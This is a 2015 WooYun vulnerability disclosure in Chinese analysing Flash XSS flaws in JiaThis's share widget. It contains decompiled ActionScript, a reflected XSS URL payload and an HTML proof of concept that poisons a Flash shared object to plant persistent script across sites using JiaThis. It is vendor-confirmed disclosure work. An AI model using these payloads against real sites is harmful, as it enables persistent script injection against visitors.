{"id": 42184, "wybug_id": "wooyun-2015-0103759", "wybug_title": "关于JiaThis Flash XSS分析", "wybug_corp": "JiaThis", "wybug_author": "story", "wybug_date": "2015-03-25 22:20", "wybug_open_date": "2015-05-10 12:18", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反射型", "持久型", "应用安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-10：\t细节向公众公开  简要描述： 先声明，这个漏洞很大一部分是360官微里提到又删掉了的，这里以分析为主。当然也有我自己发现的一个小的他们没提到的问题。 详细说明：  http://www.jiathis.com/code/swf/m.swf 反编译得到如下代码：\npackage m_fla {    import flash.display.*;    import flash.net.*;    import adobe.utils.*;    import flash.accessibility.*;    import flash.desktop.*;    import flash.errors.*;    import flash.events.*;    import flash.external.*;    import flash.filters.*;    import flash.geom.*;    import flash.media.*;    import flash.printing.*;    import flash.profiler.*;    import flash.sampler.*;    import flash.system.*;    import flash.text.*;    import flash.text.engine.*;    import flash.ui.*;    import flash.utils.*;    import flash.xml.*;    public dynamic class MainTimeline extends MovieClip {        public const appName:String = \"mao\";        public var mySo:SharedObject;        public function MainTimeline(){            addFrameScript(0, this.frame1);        }        public function writeSharedObject(param1:String, param2:String):void{            this.mySo = SharedObject.getLocal(this.appName);            this.mySo.data[param1] = param2;            this.mySo.flush();        }        function frame1(){            this.main();            stop();        }        public function deleteObjects():void{            this.mySo = SharedObject.getLocal(this.appName);            if (this.mySo != null){                this.mySo.clear();            };        }        public function deleteObject(param1:String):Boolean{            this.mySo = SharedObject.getLocal(this.appName);            if (((!((this.mySo == null))) && (!((this.mySo.data[param1] == null))))){                delete this.mySo.data[param1];                return (true);            };            return (false);        }        public function main(){            var paramObj:* = null;            Security.allowDomain(\"*\");            paramObj = root.loaderInfo.parameters;            try {                if (ExternalInterface.available){                    ExternalInterface.addCallback(\"writeSharedObject\", this.writeSharedObject);                    ExternalInterface.addCallback(\"readSharedObject\", this.readSharedObject);                    ExternalInterface.addCallback(\"readObjects\", this.readObjects);                    ExternalInterface.addCallback(\"deleteObject\", this.deleteObject);                    ExternalInterface.addCallback(\"deleteObjects\", this.deleteObjects);                    ExternalInterface.call(\"_gnayTrack.ready\", paramObj);                };            } catch(e) {            };        }        public function readSharedObject(param1:String):String{            this.mySo = SharedObject.getLocal(this.appName);            return (String(this.mySo.data[param1]));        }        public function readObjects():Object{            this.mySo = SharedObject.getLocal(this.appName);            return (this.mySo.data);        }    }}//package m_fla\n明显里面有两个漏洞。一、ExternalInterface.call(\"_gnayTrack.ready\", paramObj);paramObj是root.loaderInfo.parameters，将paramObj作为​ExternalInterface.call方法的第二个参数，第二个参数的话我们可以用\\\"的方式逃逸出引号范围，执行javascript代码。有人问了，root.loaderInfo.parameters是个对象，怎么传入​ExternalInterface.call？ExternalInterface.call的​​第二个参数应该是一个字符串，但传入对象也是可以的，实际最后执行的时候应该是类似 _gnayTrack.ready({\"a\": \"xxxxx\"})所以，我们现在不仅要闭合双引号\"，还要闭合一个大括号}和一个小括号)，所以最后的payload比大家以前见到的多了})：\nhttp://www.jiathis.com/code/swf/m.swf?a=\\\"})))}catch(e){alert(1)}//\n\n\n二、FSO造成XSS Rootkit回到刚才说的FSO，由于FSO造成的漏洞乌云上也不少了，比如 http://wooyun.org/bugs/wooyun-2014-065197 、 WooYun: 一个flash的0day导致的淘宝网存储xss(可形成永久后门)  等。​我们看到swf源码中，确实是调用了FSO对象。我们找到对象保存在我们电脑上的文件C:\\Users\\phithon\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Pepper Data\\Shockwave Flash\\WritableRoot\\#SharedObjects\\DR6LLMCM\\www.jiathis.com\\code\\swf\\m.swf\\​mao.sol\n\n可以看到保存在FSO的内容实际上就是jid=xxxx，我们在控制台直接调用swf对象获得jid的值也验证了这一点：\n\n这就好说了。我们将“脏数据”作为jia的值存入FSO，就能留下一个永久后门。简单构造一个POC：\n<html><head>\t<meta charset=\"uft-8\">\t<title>lookup</title></head><body onload=\"return rootkit();\"><p>hehe</p><!-- JiaThis Button BEGIN --><div class=\"jiathis_style\">\t<a class=\"jiathis_button_qzone\"></a>\t<a class=\"jiathis_button_tsina\"></a>\t<a class=\"jiathis_button_tqq\"></a>\t<a class=\"jiathis_button_weixin\"></a>\t<a class=\"jiathis_button_renren\"></a>\t<a href=\"http://www.jiathis.com/share\" class=\"jiathis jiathis_txt jtico jtico_jiathis\" target=\"_blank\"></a>\t<a class=\"jiathis_counter_style\"></a></div><script type=\"text/javascript\" src=\"http://v3.jiathis.com/code/jia.js?uid=1427098094896152\" charset=\"utf-8\"></script><!-- JiaThis Button END --><script>function rootkit(){\tvar a = document[\"JIATHISSWF\"];\ta.writeSharedObject(\"jid\", '\\\\\";(function(){if(location.host!=\\'mhz.pw\\'){alert(document.domain);}})();//a');}</script></body></html>\n我将之保存在 http://mhz.pw/game/jiathis/jiathis.html​，当访问了这个页面以后，再访问使用了jiathis的网站，即可在该站域下触发XSS，形成一个永久的XSS Rootkit：\n\n\n\n   漏洞证明：  见上面。   修复方案：     版权声明：转载请注明来源 story@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2015-03-26 12:16 厂商回复： 已经紧急修复该漏洞，谢谢大家。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-03-25 22:34 |    \t\t孤独雪狼 \t\t\t( 普通白帽子  |\t\t\t        Rank:710 漏洞数:145        | 七夕手机被偷，这坑爹的七夕啊 。。。。)\t\t \n  赞。。。    \n     2015-03-26 07:58 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  居然还没修复完整=。=    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}